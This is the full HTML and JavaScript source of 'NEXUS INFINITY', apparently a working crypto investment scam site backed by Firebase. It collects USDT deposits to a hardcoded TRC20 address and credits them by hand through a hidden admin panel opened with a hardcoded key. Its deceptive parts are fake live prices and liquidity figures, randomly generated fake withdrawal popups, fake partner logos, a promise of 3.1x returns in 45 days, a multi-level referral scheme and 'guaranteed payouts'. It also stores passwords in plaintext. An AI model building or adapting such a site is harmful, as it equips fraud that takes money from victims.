<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        
        :root {
            --neon-red: #ff003c;
            --neon-pink: #ff00ff;
            --black: #050505;
            --glass: rgba(15, 15, 15, 0.92);
        }

        body {
            background: var(--black);
            color: white;
            font-family: 'Plus Jakarta Sans', sans-serif;
            margin: 0;
            overflow-x: hidden;
        }

        /* Live Ticker */
        .ticker-wrap { background: rgba(255, 0, 60, 0.1); border-bottom: 1px solid rgba(255, 0, 60, 0.2); overflow: hidden; white-space: nowrap; padding: 12px 0; z-index: 1001; position: relative; }
        .ticker { display: inline-block; animation: ticker 40s linear infinite; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        /* UI Panels */
        .glass-panel { background: var(--glass); backdrop-filter: blur(30px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 30px; transition: 0.3s; }
        .apex-border { border: 1px solid var(--neon-red) !important; box-shadow: 0 0 15px rgba(255, 0, 60, 0.15); }
        
        /* Buttons */
        .btn-master { background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); color: white; font-weight: 800; padding: 18px; border-radius: 20px; transition: 0.3s; box-shadow: 0 8px 25px rgba(255, 0, 60, 0.3); border: none; width: 100%; cursor: pointer; }
        .btn-master:active { transform: scale(0.96); }
        
        /* Inputs */
        .input-dark { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); border-radius: 18px; padding: 16px; color: white; outline: none; width: 100%; font-size: 14px; }
        .input-dark:focus { border-color: var(--neon-red); background: rgba(255, 0, 60, 0.02); }

        /* Navigation */
        .nav-item { color: #555; text-align: center; cursor: pointer; transition: 0.3s; font-size: 10px; font-weight: 800; }
        .nav-item.active { color: var(--neon-red); text-shadow: 0 0 12px var(--neon-red); }

        /* FOMO Popups */
        #fomo-pop { position: fixed; bottom: 100px; left: 20px; right: 20px; max-width: 350px; background: white; color: black; padding: 12px 20px; border-radius: 18px; font-size: 11px; font-weight: 800; display: none; z-index: 9999; box-shadow: 0 15px 40px rgba(0,0,0,0.5); animation: slideIn 0.5s ease; }
        @keyframes slideIn { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .hidden { display: none !important; }
        .partner-img { filter: grayscale(1) brightness(3); opacity: 0.3; width: 70px; transition: 0.3s; }
        .partner-img:hover { opacity: 0.8; filter: grayscale(0) brightness(1); }
    </style>
</head>
<body>

    <div class="ticker-wrap">
        <div class="ticker">
            BTC/USDT $63,842.10 <span class="text-green-500">▲ +2.1%</span> &nbsp;&nbsp;&nbsp; 
            TRX/USDT $0.1190 <span class="text-green-500">▲ +4.2%</span> &nbsp;&nbsp;&nbsp; 
            ETH/USDT $3,102.50 <span class="text-red-500">▼ -0.8%</span> &nbsp;&nbsp;&nbsp; 
            TOTAL LIQUIDITY: $842,000,512 &nbsp;&nbsp;&nbsp; 
            ACTIVE NODES: 142,509 &nbsp;&nbsp;&nbsp;
            SECURE WITHDRAWALS ENABLED
        </div>
    </div>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-[#ff003c] to-[#ff00ff] rounded-[2.5rem] flex items-center justify-center text-5xl font-black shadow-[0_0_60px_rgba(255,0,60,0.4)] animate-pulse">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-8 text-white tracking-[0.4em] text-xs">NEXUS<span class="text-[#ff003c]">INFINITY</span></h1>
        <p class="text-[8px] text-zinc-600 mt-2 uppercase font-bold">Establishing Secure Link...</p>
    </div>

    <div id="fomo-pop"><i class="fa-solid fa-circle-check text-green-500 mr-2"></i> <span id="fomo-text">User Alex*** just withdrew $450.00!</span></div>

    <div id="auth-section" class="min-h-screen p-8 flex flex-col justify-center hidden">
        <div class="max-w-sm mx-auto w-full space-y-12">
            <div id="logo-tap" class="text-center">
                <div class="w-20 h-20 bg-zinc-900 mx-auto rounded-3xl flex items-center justify-center text-4xl font-black border border-white/5 shadow-2xl">N</div>
                <h2 style="font-family: 'Syncopate'" class="mt-6 text-xl tracking-tighter">NEXUS<span class="text-[#ff003c]">INFINITY</span></h2>
                <p class="text-[8px] text-zinc-500 font-bold uppercase mt-2 tracking-widest">The Global Institutional Standard</p>
            </div>

            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Terminal Account ID" class="input-dark">
                <input type="password" id="l-pass" placeholder="Institutional Key" class="input-dark">
                <button onclick="handleLogin()" class="btn-master">Authorize Identity</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer">Establish New Node Identity</p>
            </div>

            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Create Username" class="input-dark">
                <input type="password" id="s-pass" placeholder="Security Password" class="input-dark">
                <button onclick="handleSignup()" class="btn-master">Initialize Connection</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer">Return to Terminal</p>
            </div>

            <div class="flex justify-center gap-8 opacity-20 grayscale">
                <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="w-6">
                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-6">
                <img src="https://cryptologos.cc/logos/tron-trx-logo.png" class="w-6">
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-32">
        <nav class="p-6 sticky top-0 bg-black/70 backdrop-blur-2xl z-[500] border-b border-white/5 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center font-black border border-white/10">N</div>
                <div>
                    <p class="text-[7px] text-zinc-500 font-black uppercase">Identity Verified</p>
                    <p id="nav-user" class="text-sm font-black italic uppercase tracking-tighter text-[#ff003c]">...</p>
                </div>
            </div>
            <div class="flex gap-4 items-center">
                <i onclick="alert('24/7 Global Desk: @NexusInfinity_Support')" class="fa-solid fa-headset text-zinc-500"></i>
                <button onclick="logout()" class="w-10 h-10 rounded-full bg-zinc-900 flex items-center justify-center border border-white/5"><i class="fa-solid fa-power-off text-xs text-zinc-600"></i></button>
            </div>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="glass-panel p-8 bg-gradient-to-br from-zinc-900 to-black relative overflow-hidden border-t border-white/10">
                <div class="absolute -top-10 -right-10 w-40 h-40 bg-[#ff003c] opacity-10 blur-[100px]"></div>
                <p class="text-[10px] font-black text-zinc-500 uppercase tracking-[0.2em] mb-2">Institutional Balance</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter text-white">$0.00</h2>
                
                <div class="mt-8 flex justify-between items-end border-t border-white/5 pt-6">
                    <div>
                        <p class="text-[8px] font-black text-zinc-500 uppercase mb-1">Total Yield Generated</p>
                        <p id="profit-txt" class="text-xl font-black text-[#ff00ff]">+$0.00</p>
                    </div>
                    <div class="text-right">
                        <p class="text-[8px] font-black text-zinc-500 uppercase mb-1">Node Health</p>
                        <span class="text-[10px] font-black text-green-500 flex items-center gap-1 justify-end"><i class="fa-solid fa-bolt-lightning animate-pulse"></i> OPTIMAL</span>
                    </div>
                </div>
            </div>

            <div class="glass-panel p-6">
                <p class="text-[8px] font-black text-zinc-600 uppercase text-center mb-4 tracking-widest">Strategic Global Partners</p>
                <div class="flex justify-around items-center">
                    <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="partner-img">
                    <img src="https://cryptologos.cc/logos/okx-logo.png" class="partner-img w-12">
                    <img src="https://cryptologos.cc/logos/kraken-logo.png" class="partner-img">
                </div>
            </div>

            <div class="flex justify-between items-center">
                <h3 class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Active Synchronized Nodes</h3>
                <span class="text-[8px] bg-zinc-900 px-2 py-1 rounded text-zinc-400">v4.0.2</span>
            </div>
            <div id="active-nodes-list" class="space-y-4">
                <div class="p-10 text-center glass-panel border-dashed border-white/10 opacity-50">
                    <p class="text-[10px] italic">Awaiting first node deployment...</p>
                </div>
            </div>
        </div>

        <div id="page-nodes" class="p-6 space-y-6 hidden">
            <div class="glass-panel p-6 bg-zinc-900/40">
                <h3 class="text-[10px] font-black text-[#ff003c] uppercase mb-4 tracking-widest">Investment Yield Calculator</h3>
                <div class="flex gap-4">
                    <input type="number" id="calc-input" oninput="runCalc()" placeholder="Capital ($)" class="input-dark flex-1">
                    <div class="bg-black/50 p-4 rounded-2xl min-w-[120px] text-center border border-white/5">
                        <p class="text-[7px] text-zinc-500 uppercase font-black">45D Return</p>
                        <p id="calc-res" class="text-sm font-black text-green-500">$0.00</p>
                    </div>
                </div>
            </div>
            <div id="nodes-market" class="grid gap-4"></div>
        </div>

        <div id="page-finance" class="p-6 space-y-6 hidden">
            <div class="glass-panel p-7 space-y-6">
                <h3 class="text-lg font-black italic">CAPITAL INJECTION</h3>
                <div class="bg-black/60 p-4 rounded-2xl border border-white/5 relative overflow-hidden">
                    <p class="text-[8px] text-zinc-500 font-black uppercase mb-1">Institutional USDT (TRC20)</p>
                    <p class="text-[11px] font-black text-[#ff00ff] break-all">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount to Inject ($)" class="input-dark">
                <input type="text" id="dep-tid" placeholder="Transaction Hash / TID" class="input-dark">
                <button onclick="submitDep()" class="btn-master">Authorize Deposit</button>
            </div>

            <div class="glass-panel p-7 space-y-4">
                <h3 class="text-lg font-black italic">CAPITAL PAYOUT</h3>
                <input type="number" id="w-amt" placeholder="Withdrawal Amount ($)" class="input-dark">
                <input type="text" id="w-addr" placeholder="Destination Wallet (TRC20)" class="input-dark">
                <button onclick="submitWith()" class="btn-master !bg-zinc-800 shadow-none">Request Withdrawal</button>
            </div>
        </div>

        <div id="page-history" class="p-6 space-y-6 hidden">
            <h3 class="text-xl font-black italic">TERMINAL LOGS</h3>
            <div id="history-list" class="space-y-3"></div>
        </div>

        <div id="page-menu" class="p-6 space-y-6 hidden">
            <div class="glass-panel p-7 space-y-5">
                <h3 class="text-[10px] font-black text-[#ff003c] uppercase tracking-widest text-center">Institutional Referral Network</h3>
                <div class="grid grid-cols-3 gap-3">
                    <div class="bg-zinc-900 p-4 rounded-2xl text-center border border-white/5">
                        <p class="text-[8px] text-zinc-500 font-black">LVL 1</p>
                        <p class="text-sm font-black">10%</p>
                    </div>
                    <div class="bg-zinc-900 p-4 rounded-2xl text-center border border-white/5">
                        <p class="text-[8px] text-zinc-500 font-black">LVL 2</p>
                        <p class="text-sm font-black">5%</p>
                    </div>
                    <div class="bg-zinc-900 p-4 rounded-2xl text-center border border-white/5">
                        <p class="text-[8px] text-zinc-500 font-black">LVL 3</p>
                        <p class="text-sm font-black">2%</p>
                    </div>
                </div>
                <input id="ref-link" readonly class="input-dark text-center !py-3 !text-[11px] border-none bg-black/40">
                <button onclick="copyRef()" class="w-full bg-white text-black py-4 rounded-2xl font-black text-xs">COPY GLOBAL LINK</button>
            </div>

            <div class="space-y-3">
                <div onclick="alert('Nexus Infinity Global Ltd.\nReg: UAE-DXB-2026\nNodes: 1.4M Active')" class="glass-panel p-6 flex justify-between items-center text-[11px] font-black uppercase"><span><i class="fa-solid fa-building text-[#ff003c] mr-3"></i> Company Profile</span> <i class="fa-solid fa-chevron-right text-zinc-700"></i></div>
                <div onclick="alert('Privacy Policy:\n- 256-Bit SSL Encryption\n- Institutional Anonymity\n- Guaranteed Payouts')" class="glass-panel p-6 flex justify-between items-center text-[11px] font-black uppercase"><span><i class="fa-solid fa-shield-halved text-[#ff003c] mr-3"></i> Legal Protocols</span> <i class="fa-solid fa-chevron-right text-zinc-700"></i></div>
                <div onclick="alert('FAQ:\nMin Dep: $10\nMin With: $5\nSettlement: 2-24 Hours')" class="glass-panel p-6 flex justify-between items-center text-[11px] font-black uppercase"><span><i class="fa-solid fa-circle-info text-[#ff003c] mr-3"></i> Support FAQ</span> <i class="fa-solid fa-chevron-right text-zinc-700"></i></div>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-black/80 backdrop-blur-2xl border-t border-white/5 p-6 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-gauge-high text-xl mb-1"></i><p>CORE</p></div>
            <div onclick="switchPage('nodes')" class="nav-item"><i class="fa-solid fa-microchip text-xl mb-1"></i><p>NODES</p></div>
            <div onclick="switchPage('finance')" class="nav-item"><i class="fa-solid fa-vault text-xl mb-1"></i><p>VAULT</p></div>
            <div onclick="switchPage('history')" class="nav-item"><i class="fa-solid fa-list-ul text-xl mb-1"></i><p>LOGS</p></div>
            <div onclick="switchPage('menu')" class="nav-item"><i class="fa-solid fa-globe text-xl mb-1"></i><p>TRUST</p></div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-black z-[9999] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black italic text-[#ff003c] tracking-widest">MASTER OVERRIDE</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl text-zinc-600">&times;</button>
        </div>
        <div id="admin-dep-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // 10 Standard + 5 Apex Nodes
        const nodesArr = [
            ...Array.from({length: 10}, (_, i) => ({ id: i+1, type: 'Standard', title: `N-Standard 0${i+1}`, price: (i+1)*30, daily: ((i+1)*2.6).toFixed(2), days: 30 })),
            ...Array.from({length: 5}, (_, i) => ({ id: i+11, type: 'Apex', title: `Apex Alpha-0${i+1}`, price: (i+1)*500, daily: ((i+1)*55).toFixed(2), days: 45 }))
        ];

        window.onload = () => {
            renderNodes();
            startFomo();
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const user = localStorage.getItem('nexus_user');
                if(user) showDashboard(user);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2800);
        };

        function renderNodes() {
            document.getElementById('nodes-market').innerHTML = nodesArr.map(n => `
                <div class="glass-panel p-6 flex justify-between items-center ${n.type === 'Apex' ? 'apex-border' : ''}">
                    <div>
                        <p class="text-[7px] font-black ${n.type === 'Apex' ? 'text-[#ff003c]' : 'text-zinc-500'} uppercase mb-1">${n.type} Node</p>
                        <h4 class="text-xl font-black italic">${n.title}</h4>
                        <div class="flex gap-4 mt-2">
                            <div><p class="text-[6px] text-zinc-500">Daily</p><p class="text-[10px] font-black text-green-500">$${n.daily}</p></div>
                            <div><p class="text-[6px] text-zinc-500">Period</p><p class="text-[10px] font-black">${n.days}D</p></div>
                        </div>
                    </div>
                    <div class="text-right">
                        <p class="text-lg font-black italic">$${n.price}</p>
                        <button onclick="buyNode(${n.id})" class="bg-white text-black px-5 py-2 rounded-xl text-[9px] font-black uppercase mt-1">Deploy</button>
                    </div>
                </div>
            `).join('');
        }

        window.runCalc = () => {
            const val = document.getElementById('calc-input').value;
            document.getElementById('calc-res').innerText = '$' + (val * 3.1).toFixed(2);
        };

        function startFomo() {
            const users = ['Mark***', 'Saba***', 'King99***', 'Crypto***', 'X-User***'];
            const amts = [450, 120, 3000, 50, 990];
            setInterval(() => {
                const u = users[Math.floor(Math.random()*users.length)];
                const a = amts[Math.floor(Math.random()*amts.length)];
                document.getElementById('fomo-text').innerText = `User ${u} just synchronized a $${a} payout!`;
                document.getElementById('fomo-pop').style.display = 'block';
                setTimeout(() => document.getElementById('fomo-pop').style.display = 'none', 4000);
            }, 12000);
        }

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            document.getElementById('ref-link').value = window.location.origin + "/?ref=" + uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val(); if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toLocaleString();
                
                if(data.history) {
                    const h = Object.values(data.history).reverse();
                    document.getElementById('history-list').innerHTML = h.map(log => `
                        <div class="glass-panel p-5 flex justify-between items-center border-l-2 ${log.type === 'Deposit' ? 'border-green-500' : 'border-[#ff003c]'}">
                            <div><p class="text-[10px] font-black uppercase">${log.type}</p><p class="text-[7px] text-zinc-500">${log.date}</p></div>
                            <div class="text-right"><p class="text-sm font-black">$${log.amount}</p><span class="text-[8px] font-black uppercase ${log.status==='pending'?'text-yellow-500':'text-green-500'}">${log.status}</span></div>
                        </div>
                    `).join('');
                }

                if(data.activeNodes) {
                    document.getElementById('active-nodes-list').innerHTML = Object.values(data.activeNodes).map(n => `
                        <div class="glass-panel p-6 border-l-4 border-[#ff003c]">
                            <div class="flex justify-between items-center"><p class="text-[10px] font-black uppercase text-white">${n.title}</p><span class="text-[8px] text-green-500 font-black animate-pulse">SYNCED</span></div>
                            <div class="mt-4 flex justify-between"><p class="text-[8px] text-zinc-500">DAILY ROI: <span class="text-white font-black">$${n.daily}</span></p><p class="text-[8px] text-zinc-500">TERM: <span class="text-white font-black">${n.days}D</span></p></div>
                        </div>
                    `).join('');
                }
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            if(!amt || !tid) return alert("Fill Protocol Data!");
            const entry = { user, amount: amt, tid, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit' };
            const hRef = push(ref(db, `users/${user}/history`));
            await set(hRef, entry);
            await set(ref(db, `admin/deposits/${hRef.key}`), entry);
            alert("Deposit Protocol Logged. Awaiting Sync.");
        };

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user');
            const node = nodesArr.find(n => n.id === id);
            const snap = await get(ref(db, `users/${user}`));
            const bal = snap.val().balance || 0;
            if(bal < node.price) return alert("Insufficient Institutional Capital!");
            await update(ref(db, `users/${user}`), { balance: bal - node.price });
            await push(ref(db, `users/${user}/activeNodes`), { ...node });
            alert("Node Synchronized!");
            switchPage('home');
        };

        // Admin Secret
        let taps = 0; document.getElementById('admin-trigger').onclick = document.getElementById('logo-tap').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Auth Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; }
            setTimeout(() => taps = 0, 2000);
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/deposits'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-dep-list').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass-panel p-5 space-y-3">
                        <p class="text-xs">User: ${l.user} | $${l.amount}</p>
                        <p class="text-[9px] text-zinc-500">TID: ${l.tid}</p>
                        <div class="flex gap-2">
                            <button onclick="approveDep('${id}','${l.user}',${l.amount})" class="flex-1 bg-green-600 py-2 rounded-xl text-[10px] font-black">Approve</button>
                            <button onclick="rejectDep('${id}')" class="flex-1 bg-red-600 py-2 rounded-xl text-[10px] font-black">Reject</button>
                        </div>
                    </div>
                `).join('') : '<p class="text-center text-xs text-zinc-600">No Pending Protocols</p>';
            });
        }

        window.approveDep = async (id, u, a) => {
            const snap = await get(ref(db, `users/${u}`));
            await update(ref(db, `users/${u}`), { balance: (snap.val().balance || 0) + parseFloat(a) });
            await remove(ref(db, `admin/deposits/${id}`));
            alert("Approved!");
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim();
            const p = document.getElementById('s-pass').value.trim();
            if(!u || !p) return alert("Data Empty!");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 });
            alert("ID Registered!"); toggleAuth(false);
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); }
            else alert("Authorization Denied!");
        };

        window.switchPage = (p) => {
            ['home', 'nodes', 'finance', 'history', 'menu'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            if(event) event.currentTarget.classList.add('active');
        };

        window.toggleAuth = (s) => {
            document.getElementById('login-ui').classList.toggle('hidden', s);
            document.getElementById('signup-ui').classList.toggle('hidden', !s);
        };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { document.getElementById('ref-link').select(); document.execCommand('copy'); alert("Global Link Copied!"); };
    </script>
</body>
</html>
